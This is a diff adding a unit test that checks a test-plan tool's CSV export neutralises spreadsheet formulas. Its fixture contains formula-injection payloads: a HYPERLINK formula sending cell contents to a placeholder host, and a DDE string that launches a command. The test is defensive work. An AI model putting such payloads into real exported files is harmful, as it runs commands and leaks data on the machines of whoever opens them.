@@ -71,3 +71,14 @@ def test_cli_pr_then_generate_then_export(tmp_path, monkeypatch):
     assert len(rows) == 3
     r = CliRunner().invoke(app, ["testplan", "status", str(fx.cfg_path), pid])
     assert "written 2" in r.stdout
+
+
+def test_csv_neutralises_formulas(tmp_path):
+    ps = _plan(tmp_path)
+    ps.save_case("mini", "main", "p1", TestCase(id="TC-001", slot_id="s1", flow_id="f1", priority="P0",
+                                                title='=HYPERLINK("http://x/?"&A1,"click")', steps=["+cmd|' /C calc'!A0"],
+                                                expected=["@SUM(1)"], author="-me"))
+    rows = list(csv.reader(io.StringIO(export_csv(ps, "mini", "main", "p1").decode("utf-8-sig"))))
+    r = rows[1]
+    assert r[5].startswith("'=") and r[11] == "'-me"
+    assert not any(cell[:1] in "=+-@\t\r" for cell in r if cell)
